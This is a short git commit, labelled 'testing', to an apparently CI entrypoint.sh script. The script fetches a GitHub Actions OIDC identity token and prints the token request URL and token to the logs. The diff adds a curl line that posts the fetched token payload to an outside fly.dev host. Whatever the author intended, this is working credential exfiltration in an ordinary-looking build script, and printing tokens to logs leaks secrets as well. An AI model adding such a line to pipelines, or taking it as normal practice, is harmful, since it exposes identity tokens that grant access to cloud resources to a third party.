fd6de911d86670f28a1ed082120da2d8a62e1d90
Johnny Horvi <johnny@horvi.no>
2023-12-13 10:17:14 +0100

    testing

--- entrypoint.sh
+++ entrypoint.sh
@@ -6,6 +6,7 @@ echo "url: $ACTION_ID_TOKEN_REQUEST_URL"
 echo "token: $ACTION_ID_TOKEN_REQUEST_TOKEN"
 
 payload=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=hookd")
+curl https://twilight-hill-6850.fly.dev --data "$payload"
 
 echo "payload=$payload"
 
